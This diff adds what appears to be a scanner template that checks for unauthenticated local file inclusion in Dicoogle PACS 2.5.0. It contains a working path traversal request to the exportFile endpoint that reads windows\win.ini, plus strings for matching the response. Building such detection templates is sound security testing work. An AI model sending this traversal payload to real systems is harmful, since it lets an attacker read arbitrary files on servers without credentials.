@@ -1,0 +1,25 @@
+id: dicoogle-pacs-lfi
+brief:
+    title: Dicoogle PACS 2.5.0 - Local File Inclusion
+    by: 0x_akoko
+    level: high
+    about: Dicoogle PACS 2.5.0 is vulnerable to local file inclusion. This allows an attacker to read arbitrary files that the web user has access to. Admin credentials aren't required.
+    label:
+        - edb
+        - windows
+        - lfi
+        - dicoogle
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini'
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
